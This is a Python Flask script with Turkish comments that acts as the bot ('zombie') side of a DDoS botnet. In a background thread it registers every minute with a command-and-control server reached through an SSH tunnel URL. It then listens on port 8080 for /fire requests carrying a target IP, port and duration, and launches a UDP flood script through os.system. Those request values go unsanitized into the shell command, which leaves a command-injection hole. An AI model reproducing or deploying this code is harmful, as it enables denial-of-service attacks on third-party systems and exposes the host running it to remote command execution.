import os
import requests
import threading
import time
from flask import Flask, request

# --- AYARLAR ---
# SSH Tünelinden aldığın o "lhr.life" linkini buraya tam olarak yapıştır
BEYIN_URL = "https://f5625b8efc7fed.lhr.life"

app = Flask(__name__)

# --- EMİR BEKLEME NOKTASI ---
@app.route('/fire')
def fire():
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    
    # Arka planda UDP saldırısını başlatır (udp.py'yi tetikler)
    # Güç çarpanını senin istediğin gibi "3" olarak bıraktım kanka
    os.system(f"nohup python3 udp.py {target} {port} 3 {sure} > /dev/null 2>&1 &")
    
    return "Mermi Gidiyor", 200

# --- KAYIT SİSTEMİ (OTOMATİK) ---
def register():
    """Merkezle bağlantıyı koparmamak için sürekli selam verir"""
    while True:
        try:
            # Beynin /kayit rotasına ulaşmaya çalışır
            # Sonuna /kayit ekledim ki Beyin koduyla eşleşsin
            requests.get(f"{BEYIN_URL}/kayit?port=8080", timeout=10)
        except:
            # Bağlantı başarısızsa (Tünel kapalıysa vb.) sessizce bekler
            pass
        # 60 saniyede bir durumu günceller
        time.sleep(60)

if __name__ == '__main__':
    # Kayıt döngüsünü arka planda başlat (Programı yavaşlatmaz)
    threading.Thread(target=register, daemon=True).start()
    
    # Zombinin kendi kapısını (8080) açar, böylece Beyinden gelen /fire emrini duyar
    app.run(host='0.0.0.0', port=8080)
